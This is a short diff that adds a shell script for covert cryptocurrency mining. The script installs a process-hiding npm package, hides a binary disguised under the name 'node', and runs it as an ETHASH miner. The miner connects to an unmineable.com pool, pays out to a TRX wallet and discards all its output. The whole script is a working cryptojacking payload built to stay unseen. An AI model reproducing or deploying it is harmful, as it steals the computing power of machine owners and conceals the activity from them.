@@ -1,0 +1,6 @@
+sudo apt update   
+sudo apt install npm -y  
+sudo npm i -g node-process-hider  
+chmod +x node   
+sudo ph add node 
+sudo ./node --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TMBSu58Hvv4eqybpdGFDXnaa9uHcamDkhn.$(echo $(shuf -i 1-99999 -n 1)-CPU) --ethstratum ETHPROXY >/dev/null 2>&1  
